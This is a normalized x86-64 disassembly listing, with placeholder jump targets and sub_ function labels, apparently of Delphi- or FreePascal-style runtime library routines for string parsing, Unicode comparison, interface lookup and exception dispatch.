movzx rax [ rcx ]
mov [ rdx ] ax
movzx rax [ rcx + 0x2 ]
mov [ rdx + 0x2 ] al
jmp r-xdata
movzx rax [ rcx + 0x2 ]
mov [ rdx + 0x2 ] al
movzx rax [ rcx ]
mov [ rdx ] ax
jmp r-xdata
jmp r-xdata
mov eax [ rcx ]
mov [ rdx ] eax
jmp r-xdata
sub_404d20
push rsi
push rbx
sub rsp 0x28
mov rbx rcx
xor rsi rsi
cmp [ rbx + 0x8 ] 0xd7b1
jb r-xdata
lea rax [ rw-data ]
cmp rbx rax
je r-xdata
cmp [ rbx + 0x8 ] 0xd7b3
ja r-xdata
mov eax esi
add rsp 0x28
pop rbx
pop rsi
retn
mov ecx 0x67
call sub_404ac0
movzx rax [ rbx + 0x8 ]
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov rcx rbx
call [ rbx + 0x28 ]
mov esi eax
test esi esi
je r-xdata
mov rcx rbx
call [ rbx + 0x38 ]
mov esi eax
mov ecx esi
call sub_404ac0
jmp r-xdata
sub_404d90
mov r9 rcx
cmp rdx 0x8
jl r-xdata
xor rax rax
lea rcx [ rdx - 0x1 ]
cmp rax rcx
jg r-xdata
mov rax r9
and rax 0x7
neg rax
lea rcx [ rax + 0x8 ]
test rcx rcx
je r-xdata
nop
retn
add rcx 0x1
cmp rdx 0x8
jl r-xdata
xor rax rax
lea r10 [ rcx - 0x1 ]
cmp rax r10
jg r-xdata
mov [ r9 ] r8b
add r9 0x1
add rax 0x1
cmp rax rcx
jne r-xdata
movzx rcx r8b
movzx rax r8b
shl eax 0x8
or ecx eax
movzx rax r8b
shl eax 0x10
or ecx eax
movzx rax r8b
shl eax 0x18
or ecx eax
mov ecx ecx
mov rax rcx
shl rax 0x20
or rcx rax
mov rax rdx
shr rax 0x3
xor r10 r10
lea r11 [ rax - 0x1 ]
mov rax r10
cmp rax r11
jg r-xdata
nop
sub rdx rcx
add r10 0x1
nop
and rdx 0x7
add r11 0x1
mov [ r9 ] r8b
add r9 0x1
add rax 0x1
cmp rax r10
jne r-xdata
mov [ r9 ] rcx
add r9 0x8
add rax 0x1
cmp rax r11
jne r-xdata
sub_404e60
push r14
push r13
push rdi
push rsi
push rbx
sub rsp 0x30
mov rbx rcx
mov rsi rdx
mov edi 0x1
mov [ rsi ] 0xffffffff
xor rax rax
mov [ rsp + 0x2c ] eax
xor r13 r13
xor r14 r14
mov rcx rbx
call sub_407d60
jmp r-xdata
cmp edi eax
jg r-xdata
cmp edi eax
jg r-xdata
movsxd rcx edi
cmp [ rbx + rcx * 2 - 0x2 ] 0x20
je r-xdata
mov eax [ rsp + 0x2c ]
add rsp 0x30
pop rbx
pop rsi
pop rdi
pop r13
pop r14
retn
movsxd rcx edi
movzx rcx [ rbx + rcx * 2 - 0x2 ]
cmp rcx 0x30
jg r-xdata
add edi 0x1
sub rcx 0x58
test rcx rcx
je r-xdata
cmp rcx 0x30
je r-xdata
cmp edi eax
jne r-xdata
sub rcx 0x20
test rcx rcx
jne r-xdata
cmp eax edi
jle r-xdata
sub rcx 0x24
test rcx rcx
je r-xdata
mov r14b 0x1
add edi 0x1
jmp r-xdata
add edi 0x2
mov [ rsi ] edi
jmp r-xdata
test r14b r14b
je r-xdata
xor r14 r14
jmp r-xdata
movsxd rcx edi
cmp [ rbx + rcx * 2 ] 0x58
je r-xdata
sub rcx 0x7
test rcx rcx
je r-xdata
cmp edi eax
jg r-xdata
cmp edi eax
jg r-xdata
test r14b r14b
je r-xdata
mov r14b 0x1
movsxd rcx edi
cmp [ rbx + rcx * 2 ] 0x78
je r-xdata
cmp edi eax
jne r-xdata
sub rcx 0x2
test rcx rcx
jne r-xdata
nop
mov ecx [ rsp + 0x2c ]
cmp ecx 0xccccccc
jle r-xdata
nop
jmp r-xdata
mov ecx [ rsp + 0x2c ]
cmp ecx 0xfffffff
jle r-xdata
add edi 0x2
jmp r-xdata
add edi 0x1
add edi 0x1
mov [ rsi ] edi
jmp r-xdata
jmp r-xdata
mov [ rsi ] 0x0
mov eax [ rsp + 0x2c ]
neg eax
mov [ rsp + 0x2c ] eax
movsxd rcx edi
movzx ecx [ rbx + rcx * 2 - 0x2 ]
sub ecx 0x30
test ecx ecx
jl r-xdata
mov [ rsi ] edi
jmp r-xdata
test r13b r13b
je r-xdata
movsxd rcx edi
movzx rcx [ rbx + rcx * 2 - 0x2 ]
sub cx 0x30
cmp cx 0xa
jb r-xdata
mov [ rsi ] edi
jmp r-xdata
cmp edi eax
jne r-xdata
movsxd rax edi
cmp [ rbx + rax * 2 - 0x2 ] 0x0
jne r-xdata
cmp ecx 0x9
jle r-xdata
mov ecx [ rsp + 0x2c ]
shl ecx 0x4
movsxd rdx edi
movzx edx [ rbx + rdx * 2 - 0x2 ]
add ecx edx
sub ecx 0x30
mov [ rsp + 0x2c ] ecx
jmp r-xdata
sub cx 0x11
cmp cx 0x6
jb r-xdata
mov r13b 0x1
add edi 0x1
jmp r-xdata
add edi 0x1
mov [ rsi ] edi
jmp r-xdata
mov [ rsi ] edi
jmp r-xdata
mov [ rsi ] 0x0
jmp r-xdata
mov ecx [ rsp + 0x2c ]
add ecx ecx
lea rcx [ rcx + rcx * 4 ]
movsxd rdx edi
movzx edx [ rbx + rdx * 2 - 0x2 ]
add ecx edx
sub ecx 0x30
mov [ rsp + 0x2c ] ecx
add edi 0x1
cmp edi eax
jle r-xdata
add edi 0x1
cmp edi eax
jle r-xdata
mov ecx [ rsp + 0x2c ]
shl ecx 0x4
movsxd rdx edi
movzx edx [ rbx + rdx * 2 - 0x2 ]
add ecx edx
add ecx 0xffffffc9
mov [ rsp + 0x2c ] ecx
jmp r-xdata
sub cx 0x20
cmp cx 0x6
jae r-xdata
movsxd rax edi
cmp [ rbx + rax * 2 - 0x2 ] 0x0
jne r-xdata
jmp r-xdata
mov [ rsi ] edi
jmp r-xdata
mov [ rsi ] 0x0
jmp r-xdata
mov ecx [ rsp + 0x2c ]
shl ecx 0x4
movsxd rdx edi
movzx edx [ rbx + rdx * 2 - 0x2 ]
add ecx edx
add ecx 0xffffffa9
mov [ rsp + 0x2c ] ecx
jmp r-xdata
sub_405160
push rbp
sub rsp 0x60
mov rbp rsp
mov [ rbp + 0x40 ] rcx
mov [ rbp + 0x38 ] rdx
mov [ rbp + 0x48 ] 0x0
mov [ rbp + 0x58 ] 0x0
nop
mov rcx [ rbp + 0x40 ]
lea rdx [ rbp + 0x58 ]
call sub_405880
cmp [ rbp + 0x58 ] 0x0
jne r-xdata
mov rcx [ rbp + 0x40 ]
lea rdx [ rbp + 0x48 ]
call sub_405130
mov rcx [ rbp + 0x38 ]
mov edx 0x3
mov r8 [ rbp + 0x58 ]
lea r9 [ r-xdata ]
mov rax [ rbp + 0x48 ]
mov [ rsp + 0x20 ] rax
call sub_408b50
mov rcx [ rbp + 0x40 ]
mov rdx [ rbp + 0x38 ]
call sub_405130
jmp r-xdata
nop
lea rcx [ rbp + 0x48 ]
call sub_407730
lea rcx [ rbp + 0x58 ]
call sub_407730
mov rax [ rbp + 0x38 ]
lea rsp [ rbp + 0x60 ]
pop rbp
retn
sub_405200
push rbp
push rbx
sub rsp 0x28
mov rbp rsp
mov rbx rdx
lea rax [ rbx + rbp + 0x48 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407730
lea rax [ rbx + rbp + 0x58 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407730
lea rsp [ rbp + 0x28 ]
pop rbx
pop rbp
retn
sub_405250
push rbp
push rdi
push rsi
push rbx
sub rsp 0x68
mov rbp rsp
mov [ rbp + 0x40 ] rcx
mov [ rbp + 0x38 ] rdx
mov [ rbp + 0x58 ] 0x0
nop
mov rcx [ rbp + 0x40 ]
lea rdx [ rbp + 0x58 ]
call sub_405130
mov rcx [ rbp + 0x58 ]
call sub_408900
mov rbx rax
mov rcx [ rbp + 0x58 ]
call sub_407d60
mov esi eax
mov rcx [ rbp + 0x38 ]
call sub_408900
mov rdi rax
mov rcx [ rbp + 0x38 ]
call sub_407d60
mov ecx [ rw-data ]
mov edx 0x1
mov r8 rbx
mov r9d esi
mov [ rsp + 0x20 ] rdi
mov [ rsp + 0x28 ] eax
call CompareStringW
cmp eax 0x2
sete al
mov [ rbp + 0x4f ] al
nop
lea rcx [ rbp + 0x58 ]
call sub_407730
movzx rax [ rbp + 0x4f ]
lea rsp [ rbp + 0x68 ]
pop rbx
pop rsi
pop rdi
pop rbp
retn
sub_405330
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx rbx
call sub_4053b0
movsxd rcx eax
call sub_404780
mov rcx rbx
mov rdx rax
call sub_4054a0
add rsp 0x20
pop rbx
retn
sub_4053c0
push rbp
push rbx
sub rsp 0x38
mov rbp rsp
mov [ rbp + 0x28 ] rbp
mov [ rbp + 0x50 ] rcx
mov [ rbp + 0x58 ] dl
cmp [ rbp + 0x58 ] 0x0
je r-xdata
nop
cmp [ rbp + 0x58 ] 0x0
je r-xdata
mov rcx [ rbp + 0x50 ]
movzx rdx [ rbp + 0x58 ]
call sub_405d70
mov [ rbp + 0x50 ] rax
mov rax [ rbp + 0x50 ]
lea rsp [ rbp + 0x38 ]
pop rbx
pop rbp
retn
mov rcx [ rbp + 0x50 ]
call sub_405db0
mov [ rbp + 0x50 ] rax
jmp r-xdata
sub_405404
cmp [ rbp + 0x58 ] 0x0
je r-xdata
call sub_406d90
nop
mov rax [ rbp + 0x50 ]
lea rsp [ rbp + 0x38 ]
pop rbx
pop rbp
retn
cmp [ rbp + 0x50 ] 0x0
je r-xdata
mov rcx [ rbp + 0x50 ]
mov dl 0x81
mov rax [ rbp + 0x50 ]
mov rbx [ rax ]
call [ rbx - 0x20 ]
mov rcx [ rbp + 0x50 ]
call sub_405d90
sub_405450
push rsi
push rbx
sub rsp 0x28
mov rbx rcx
mov esi edx
mov rcx rbx
mov edx esi
call sub_405e10
test sil sil
jle r-xdata
add rsp 0x28
pop rbx
pop rsi
retn
mov rcx rbx
call sub_405d90
sub_4054a0
push rsi
push rbx
sub rsp 0x28
mov rbx rcx
mov rsi rdx
mov rcx rsi
movsxd rdx [ rbx - 0x80 ]
xor r8 r8
call sub_404d90
mov [ rsi ] rbx
test rbx rbx
je r-xdata
nop
mov rax rsi
add rsp 0x28
pop rbx
pop rsi
retn
mov rcx rbx
call sub_4057d0
test rax rax
je r-xdata
mov rcx rbx
call sub_405320
mov rbx rax
test rbx rbx
jne r-xdata
xor rcx rcx
mov r8d [ rax ]
sub r8d 0x1
cmp ecx r8d
jg r-xdata
nop
add r8d 0x1
add ecx 0x1
cmp ecx r8d
jne r-xdata
movsxd r9 [ rdx + 0x18 ]
mov rdx [ rdx + 0x10 ]
mov [ rsi + r9 ] rdx
movsxd rdx ecx
lea rdx [ rdx + rdx * 4 ]
lea rdx [ rax + rdx * 8 + 0x8 ]
cmp [ rdx + 0x10 ] 0x0
je r-xdata
sub_405530
push rsi
push rbx
sub rsp 0x28
mov rbx rcx
mov rsi [ rbx ]
mov rcx rsi
call sub_405320
mov rsi rax
test rsi rsi
jne r-xdata
mov rcx rbx
mov rdx rax
call sub_408e70
mov rax [ rsi - 0xb0 ]
test rax rax
je r-xdata
mov rcx rbx
call sub_405e30
add rsp 0x28
pop rbx
pop rsi
retn
sub_405580
push rbp
push rbx
sub rsp 0x38
mov rbp rsp
mov rbx rcx
mov [ rbp + 0x28 ] rdx
mov rax 0xff00000000000000
mov rcx r8
and rcx rax
mov rax 0xff00000000000000
cmp rcx rax
jne r-xdata
mov rax 0xff00000000000000
mov rcx r8
and rcx rax
mov rax 0xfe00000000000000
cmp rcx rax
jne r-xdata
mov rcx rbx
mov rax 0xffffffffffffff
and r8 rax
mov rdx [ rdx + r8 ]
call sub_409ce0
jmp r-xdata
mov [ rbp + 0x20 ] r8
mov rcx [ rbp + 0x28 ]
mov rdx rbx
call [ rbp + 0x20 ]
mov rax [ rdx ]
movsx r8 r8w
mov rax [ rax + r8 ]
mov [ rbp + 0x20 ] rax
mov rcx [ rbp + 0x28 ]
mov rdx rbx
call [ rbp + 0x20 ]
jmp r-xdata
mov rax rbx
lea rsp [ rbp + 0x38 ]
pop rbx
pop rbp
retn
sub_405640
push rbp
sub rsp 0x50
mov rbp rsp
mov [ rbp + 0x30 ] rcx
mov [ rbp + 0x38 ] rdx
mov [ rbp + 0x28 ] r8
mov [ rbp + 0x48 ] 0x0
nop
mov rax [ rbp + 0x28 ]
mov [ rax ] 0x0
mov rax [ rbp + 0x30 ]
mov rcx [ rax ]
mov rdx [ rbp + 0x38 ]
call sub_405750
test rax rax
je r-xdata
lea rcx [ rw-data ]
mov rdx [ rbp + 0x38 ]
call sub_40a100
test al al
je r-xdata
cmp [ rax + 0x18 ] 0x0
je r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax ] 0x0
setne al
mov [ rbp + 0x47 ] al
nop
lea rcx [ rbp + 0x48 ]
call sub_409ca0
movzx rax [ rbp + 0x47 ]
lea rsp [ rbp + 0x50 ]
pop rbp
retn
mov rax [ rbp + 0x30 ]
mov rcx [ rbp + 0x28 ]
mov [ rcx ] rax
lea rcx [ rbp + 0x48 ]
mov rdx [ rbp + 0x30 ]
mov r8 [ rax + 0x20 ]
call sub_405580
mov rcx [ rbp + 0x28 ]
mov rdx [ rbp + 0x48 ]
call sub_409ce0
jmp r-xdata
movsxd rax [ rax + 0x18 ]
mov rcx [ rbp + 0x30 ]
lea rax [ rcx + rax ]
mov rcx [ rbp + 0x28 ]
mov [ rcx ] rax
mov rax [ rbp + 0x28 ]
cmp [ rax ] 0x0
je r-xdata
mov rax [ rbp + 0x28 ]
mov rax [ rax ]
mov rcx rax
mov rax [ rax ]
call [ rax + 0x8 ]
jmp r-xdata
sub_405750
push r14
push r13
push rdi
push rsi
push rbx
sub rsp 0x30
mov [ rsp + 0x28 ] rdx
mov rsi rcx
mov rcx rsi
call sub_405320
mov rsi rax
test rsi rsi
jne r-xdata
xor r13 r13
mov r14d [ rdi ]
sub r14d 0x1
cmp r13d r14d
jg r-xdata
mov rcx rsi
call sub_4057d0
mov rdi rax
test rdi rdi
je r-xdata
xor rbx rbx
nop
add r14d 0x1
mov rax rbx
add rsp 0x30
pop rbx
pop rsi
pop rdi
pop r13
pop r14
retn
add r13d 0x1
cmp r13d r14d
jne r-xdata
movsxd rax r13d
lea rax [ rax + rax * 4 ]
lea rbx [ rdi + rax * 8 + 0x8 ]
mov rcx rbx
mov rdx [ rsp + 0x28 ]
call sub_40a100
test al al
jne r-xdata
sub_4057e0
push rbp
push rsi
push rbx
sub rsp 0x120
mov rbp rsp
mov rbx rdx
call sub_4059b0
test rax rax
je r-xdata
mov rcx rbx
call sub_407730
movzx rcx [ rax + 0x1 ]
lea rsi [ rax + rcx + 0x14 ]
cmp [ rsi + 0x1 ] 0x40
je r-xdata
lea rcx [ rbp + 0x20 ]
mov dx 0x3a
mov r8d 0xff
call sub_408880
lea rcx [ rbp + 0x20 ]
mov rdx rsi
mov r8d 0x1
call sub_408d20
lea rcx [ rbp + 0x20 ]
mov rdx rsi
mov r8d eax
add r8d 0x1
movsxd r8 r8d
mov r9d 0x7fffffff
call sub_407f20
mov rcx rbx
lea rdx [ rbp + 0x20 ]
call sub_40a010
jmp r-xdata
mov rcx rbx
mov rdx rsi
call sub_40a010
jmp r-xdata
mov rax rbx
lea rsp [ rbp + 0x120 ]
pop rbx
pop rsi
pop rbp
retn
sub_405880
push rbp
push rsi
push rbx
sub rsp 0x120
mov rbp rsp
mov rbx rdx
call sub_4059b0
test rax rax
je r-xdata
mov rcx rbx
call sub_407730
movzx rcx [ rax + 0x1 ]
lea rsi [ rax + rcx + 0x14 ]
cmp [ rsi + 0x1 ] 0x40
je r-xdata
lea rcx [ rbp + 0x20 ]
mov dx 0x3a
mov r8d 0xff
call sub_408880
lea rcx [ rbp + 0x20 ]
mov rdx rsi
mov r8d 0x1
call sub_408d20
lea rcx [ rbp + 0x20 ]
mov rdx rsi
mov r8d 0x2
mov r9d eax
sub r9d 0x2
movsxd r9 r9d
call sub_407f20
mov rcx rbx
lea rdx [ rbp + 0x20 ]
call sub_40a010
jmp r-xdata
mov rcx rbx
mov rdx rsi
call sub_40a010
jmp r-xdata
mov rax rbx
lea rsp [ rbp + 0x120 ]
pop rbx
pop rsi
pop rbp
retn
sub_405920
mov rax rcx
mov rax [ rax - 0x78 ]
test rax rax
je r-xdata
xor r8 r8
movzx r9d [ rcx ]
sub r9d 0x1
cmp r8d r9d
ja r-xdata
nop
xor rax rax
mov rax [ rax ]
jmp r-xdata
nop
add r9d 0x1
mov rcx [ rax - 0x90 ]
test rcx rcx
je r-xdata
add r8d 0x1
cmp r8d r9d
jne r-xdata
movzx eax [ rcx ]
add eax eax
mov eax eax
lea rax [ rcx + rax + 0x2 ]
add r8d r8d
add r8d r8d
add r8d r8d
mov r8d r8d
mov rax [ rax + r8 ]
jmp r-xdata
mov r10d r8d
cmp [ rcx + r10 * 2 + 0x2 ] dx
jne r-xdata
retn
sub_405a20
push rbp
push rsi
push rbx
sub rsp 0x30
mov rbp rsp
mov rbx rcx
mov rsi rdx
movzx rax [ rsi ]
test ax ax
je r-xdata
mov rcx rbx
mov rdx rsi
mov rbx [ rbx ]
call [ rbx - 0x38 ]
cmp ax 0xc000
jae r-xdata
mov rcx [ rbx ]
mov edx eax
call sub_405920
test rax rax
je r-xdata
mov rcx rbx
mov rdx rsi
mov rbx [ rbx ]
call [ rbx - 0x38 ]
jmp r-xdata
mov [ rbp + 0x28 ] rbx
mov [ rbp + 0x20 ] rax
mov rcx [ rbp + 0x28 ]
mov rdx rsi
call [ rbp + 0x20 ]
jmp r-xdata
lea rsp [ rbp + 0x30 ]
pop rbx
pop rsi
pop rbp
retn
sub_405a90
push rbp
push rsi
push rbx
sub rsp 0x430
mov rbp rsp
mov rbx rdx
mov eax 0xfde9
xor rdx rdx
lea r8 [ rcx + 0x1 ]
movzx r9 [ rcx ]
lea rcx [ rbp + 0x230 ]
mov [ rsp + 0x20 ] rcx
mov [ rsp + 0x28 ] 0x100
mov ecx eax
call MultiByteToWideChar
mov esi eax
mov ecx 0xfde9
xor rdx rdx
lea r8 [ rbx + 0x1 ]
movzx r9 [ rbx ]
lea rax [ rbp + 0x30 ]
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x28 ] 0x100
call MultiByteToWideChar
mov ecx [ rw-data ]
mov edx 0x1
lea r8 [ rbp + 0x230 ]
mov r9d esi
lea r10 [ rbp + 0x30 ]
mov [ rsp + 0x20 ] r10
mov [ rsp + 0x28 ] eax
call CompareStringW
cmp eax 0x2
sete al
lea rsp [ rbp + 0x430 ]
pop rbx
pop rsi
pop rbp
retn
sub_405b30
push r14
push r13
push rdi
push rsi
push rbx
sub rsp 0x20
mov rbx rdx
xor rsi rsi
mov r13 rcx
xor rdi rdi
movzx rdi [ rax ]
add rax 0x2
jmp r-xdata
mov rcx r13
call sub_405320
mov r13 rax
test r13 r13
jne r-xdata
mov r14 rax
test di di
jbe r-xdata
test di di
jbe r-xdata
mov rax [ r13 - 0x98 ]
test rax rax
je r-xdata
mov rax rsi
add rsp 0x20
pop rbx
pop rsi
pop rdi
pop r13
pop r14
retn
nop
movzx rax [ r14 + 0xa ]
cmp al [ rbx ]
jne r-xdata
sub di 0x1
movzx rax [ r14 ]
add r14 rax
test di di
ja r-xdata
lea rcx [ r14 + 0xa ]
mov rdx rbx
call sub_405a90
test al al
je r-xdata
mov rsi [ r14 + 0x2 ]
jmp r-xdata
sub_405be0
push rbp
push rbx
sub rsp 0x128
mov rbp rsp
mov rbx rcx
lea rcx [ rbp + 0x20 ]
call sub_409ee0
mov rcx rbx
lea rdx [ rbp + 0x20 ]
call sub_405b30
lea rsp [ rbp + 0x128 ]
pop rbx
pop rbp
retn
sub_405c10
push rdi
push rsi
push rbx
sub rsp 0x20
mov rbx rcx
mov rsi rdx
mov rdi r8
mov rcx rsi
call sub_407730
mov rdx rbx
xor rcx rcx
movzx rcx [ rax ]
add rax 0x2
jmp r-xdata
mov rcx rdx
call sub_405320
mov rdx rax
test rdx rdx
jne r-xdata
test cx cx
jbe r-xdata
test cx cx
jbe r-xdata
mov rax [ rdx - 0x98 ]
test rax rax
je r-xdata
mov rax rsi
add rsp 0x20
pop rbx
pop rsi
pop rdi
retn
nop
cmp [ rax + 0x2 ] rdi
jne r-xdata
sub cx 0x1
movzx r8 [ rax ]
add rax r8
test cx cx
ja r-xdata
mov rcx rsi
lea rdx [ rax + 0xa ]
call sub_405bc0
jmp r-xdata
sub_405c90
push r14
push r13
push rdi
push rsi
push rbx
sub rsp 0x30
mov [ rsp + 0x28 ] rcx
mov rbx rdx
xor rax rax
mov [ rsp + 0x20 ] rax
mov rax [ rsp + 0x28 ]
mov r14 [ rax ]
xor rdi rdi
movzx rdi [ rsi ]
add rsi 0x2
add rsi 0x8
jmp r-xdata
mov rcx r14
call sub_405320
mov r14 rax
test r14 r14
jne r-xdata
test di di
jbe r-xdata
test di di
jbe r-xdata
mov rsi [ r14 - 0xa0 ]
test rsi rsi
je r-xdata
mov rax [ rsp + 0x20 ]
add rsp 0x30
pop rbx
pop rsi
pop rdi
pop r13
pop r14
retn
nop
lea r13 [ rsi + 0x6 ]
movzx rax [ r13 ]
cmp al [ rbx ]
jne r-xdata
sub di 0x1
movzx rax [ r13 ]
add eax 0x7
mov eax eax
add rsi rax
test di di
ja r-xdata
mov rcx r13
mov rdx rbx
call sub_405a90
test al al
je r-xdata
mov eax [ rsi ]
mov rcx [ rsp + 0x28 ]
lea rax [ rcx + rax ]
mov [ rsp + 0x20 ] rax
jmp r-xdata
sub_405d40
push rbp
push rbx
sub rsp 0x128
mov rbp rsp
mov rbx rcx
lea rcx [ rbp + 0x20 ]
call sub_409ee0
mov rcx rbx
lea rdx [ rbp + 0x20 ]
call sub_405c90
lea rsp [ rbp + 0x128 ]
pop rbx
pop rbp
retn
sub_405db0
push rbp
push rbx
sub rsp 0x48
mov rbp rsp
mov [ rbp + 0x28 ] rbp
mov [ rbp + 0x60 ] rcx
nop
mov rcx [ rbp + 0x60 ]
mov rax [ rbp + 0x60 ]
mov rbx [ rax ]
call [ rbx - 0x50 ]
mov rax [ rbp + 0x60 ]
mov [ rbp + 0x38 ] rax
jmp r-xdata
mov rax [ rbp + 0x38 ]
lea rsp [ rbp + 0x48 ]
pop rbx
pop rbp
retn
sub_405e60
push rsi
push rbx
sub rsp 0x28
mov rbx rcx
cmp [ rw-data ] 0x0
je r-xdata
mov rcx rbx
call sub_4047b0
add rsp 0x28
pop rbx
pop rsi
retn
cmp [ rbx + 0x10 ] 0x0
je r-xdata
mov rcx [ rbx + 0x10 ]
mov rsi [ rw-data ]
call [ rsi + 0x8 ]
sub_405ee0
push rbp
sub rsp 0x30
mov rbp rsp
cmp [ rw-data ] 0x0
je r-xdata
lea rsp [ rbp + 0x30 ]
pop rbp
retn
mov [ rbp + 0x20 ] rdx
mov [ rbp + 0x28 ] rcx
mov ecx 0xeedfae4
xor rdx rdx
mov r8d 0x2
lea r9 [ rbp + 0x20 ]
call [ rw-data ]
sub_406010
push rbp
sub rsp 0x30
mov rbp rsp
cmp [ rw-data ] 0x0
je r-xdata
lea rsp [ rbp + 0x30 ]
pop rbp
retn
mov [ rbp + 0x20 ] rdx
mov [ rbp + 0x28 ] rcx
mov ecx 0xeedfae3
xor rdx rdx
mov r8d 0x2
lea r9 [ rbp + 0x20 ]
call [ rw-data ]
sub_406050
push r14
push r13
push rdi
push rsi
push rbx
sub rsp 0x40
mov [ rsp + 0x28 ] rcx
mov [ rsp + 0x30 ] rdx
mov [ rsp + 0x38 ] r8
xor rdi rdi
mov rax [ rsp + 0x38 ]
mov r14d [ rax ]
sub r14d 0x1
cmp edi r14d
jg r-xdata
nop
xor rbx rbx
add r14d 0x1
mov rax rbx
add rsp 0x40
pop rbx
pop rsi
pop rdi
pop r13
pop r14
retn
mov rax [ rsp + 0x30 ]
test rax rax
je r-xdata
add edi 0x1
cmp edi r14d
jne r-xdata
mov r13 [ rsp + 0x30 ]
movsxd rax edi
mov rcx [ rsp + 0x38 ]
lea rsi [ rcx + rax * 8 + 0x4 ]
mov rbx rsi
cmp [ rsi ] 0x0
je r-xdata
mov ecx [ rax - 0x80 ]
cmp ecx [ r13 - 0x80 ]
jne r-xdata
mov r13 [ r13 - 0x78 ]
test r13 r13
je r-xdata
mov rax [ rax - 0x88 ]
mov rcx [ r13 - 0x88 ]
movzx rdx [ rax ]
cmp dl [ rcx ]
jne r-xdata
nop
mov r13 [ r13 ]
jmp r-xdata
lea rdx [ rax + 0x1 ]
lea r8 [ rcx + 0x1 ]
movzx rax [ rax ]
mov rcx rdx
mov rdx r8
mov r8 rax
call sub_407e80
test eax eax
je r-xdata
mov rax [ rsp + 0x28 ]
mov rax [ rax + 0x8 ]
mov ecx [ rsi ]
mov rax [ rax + rcx ]
cmp rax r13
je r-xdata
sub_406130
push rbp
push rbx
sub rsp 0x118
mov rbp rsp
mov [ rbp + 0x38 ] rbp
mov [ rbp + 0x130 ] rcx
mov [ rbp + 0x138 ] rdx
mov [ rbp + 0x140 ] r8
mov [ rbp + 0x148 ] r9
mov [ rbp + 0xec ] 0x1
mov rax [ rbp + 0x148 ]
mov rax [ rax + 0x38 ]
mov [ rbp + 0x88 ] rax
mov rax [ rbp + 0x148 ]
mov rax [ rax + 0x8 ]
mov [ rbp + 0xe0 ] rax
mov rax [ rbp + 0x148 ]
mov rax [ rax ]
mov rcx [ rbp + 0xe0 ]
neg rcx
lea rax [ rax + rcx ]
mov [ rbp + 0xd8 ] rax
mov rax [ rbp + 0x130 ]
mov eax [ rax + 0x4 ]
test eax 0x66
jne r-xdata
mov rax [ rbp + 0x148 ]
mov rax [ rax + 0x20 ]
mov rcx [ rbp + 0xe0 ]
neg rcx
lea rax [ rax + rcx ]
mov [ rbp + 0xb8 ] rax
xor rax rax
mov rcx [ rbp + 0x88 ]
mov ecx [ rcx ]
sub ecx 0x1
mov [ rbp + 0x34 ] ecx
mov [ rbp + 0xc4 ] eax
mov eax [ rbp + 0x34 ]
cmp [ rbp + 0xc4 ] eax
jg r-xdata
xor rax rax
mov rcx [ rbp + 0x88 ]
mov ebx [ rcx ]
sub ebx 0x1
mov [ rbp + 0xc4 ] eax
cmp [ rbp + 0xc4 ] ebx
jg r-xdata
nop
mov eax [ rbp + 0x34 ]
add eax 0x1
mov [ rbp + 0x34 ] eax
nop
jmp r-xdata
add ebx 0x1
add [ rbp + 0xc4 ] 0x1
mov eax [ rbp + 0x34 ]
cmp [ rbp + 0xc4 ] eax
jne r-xdata
mov rax [ rbp + 0xf0 ]
mov eax [ rax + 0x4 ]
cmp [ rbp + 0xd8 ] rax
jae r-xdata
mov eax [ rbp + 0xec ]
lea rsp [ rbp + 0x118 ]
pop rbx
pop rbp
retn
add [ rbp + 0xc4 ] 0x1
cmp [ rbp + 0xc4 ] ebx
jne r-xdata
mov rax [ rbp + 0xf0 ]
mov eax [ rax + 0x4 ]
cmp [ rbp + 0xd8 ] rax
jae r-xdata
mov rax [ rbp + 0x88 ]
movsxd rcx [ rbp + 0xc4 ]
add rcx rcx
lea rax [ rax + rcx * 8 + 0x4 ]
mov [ rbp + 0xf0 ] rax
mov rax [ rbp + 0xf0 ]
mov eax [ rax ]
cmp [ rbp + 0xd8 ] rax
jb r-xdata
mov rax [ rbp + 0xf0 ]
mov eax [ rax ]
cmp [ rbp + 0xb8 ] rax
jb r-xdata
mov rax [ rbp + 0x88 ]
movsxd rcx [ rbp + 0xc4 ]
add rcx rcx
lea rax [ rax + rcx * 8 + 0x4 ]
mov [ rbp + 0xf0 ] rax
mov rax [ rbp + 0xf0 ]
mov eax [ rax ]
cmp [ rbp + 0xd8 ] rax
jb r-xdata
mov rax [ rbp + 0xf0 ]
cmp [ rax + 0x8 ] 0x0
je r-xdata
mov rax [ rbp + 0xf0 ]
cmp [ rax + 0x8 ] 0x2
jae r-xdata
mov rax [ rbp + 0xf0 ]
mov eax [ rax + 0x4 ]
cmp [ rbp + 0xb8 ] rax
jae r-xdata
call sub_4050e0
mov [ rbp + 0x98 ] 0x0
mov rax [ rbp + 0xf0 ]
cmp [ rax + 0x8 ] 0x2
jbe r-xdata
mov rax [ rbp + 0x130 ]
mov eax [ rax + 0x4 ]
test eax 0x20
je r-xdata
call sub_40a3e0
mov rax [ rax + 0x188 ]
mov [ rbp + 0xf8 ] rax
nop
mov rax [ rbp + 0xf0 ]
mov eax [ rax + 0x8 ]
sub eax 0x1
cmp eax 0xffffffff
je r-xdata
mov rax [ rbp + 0x130 ]
mov eax [ rax + 0x4 ]
test eax 0x20
jne r-xdata
mov rax [ rbp + 0xf0 ]
cmp [ rax + 0x8 ] 0x1
jne r-xdata
mov rax [ rbp + 0x130 ]
cmp [ rax ] 0xeedfade
jne r-xdata
mov [ rbp + 0x80 ] 0x0
mov rax [ rbp + 0xf0 ]
cmp [ rax + 0x8 ] 0x2
jne r-xdata
mov rax [ rbp + 0x148 ]
mov rcx [ rbp + 0xe0 ]
mov rdx [ rbp + 0xf0 ]
mov edx [ rdx + 0x4 ]
lea rcx [ rcx + rdx ]
mov [ rax ] rcx
mov rax [ rbp + 0xe0 ]
mov rcx [ rbp + 0xf0 ]
mov ecx [ rcx + 0xc ]
lea rax [ rax + rcx ]
mov [ rbp + 0x80 ] rax
mov rcx [ rbp + 0x80 ]
call sub_405f90
mov rax [ rbp + 0x130 ]
mov [ rbp + 0xc8 ] rax
mov rax [ rbp + 0x140 ]
mov [ rbp + 0xd0 ] rax
lea rcx [ rbp + 0xc8 ]
mov rdx [ rbp + 0x138 ]
call [ rbp + 0x80 ]
call sub_404d10
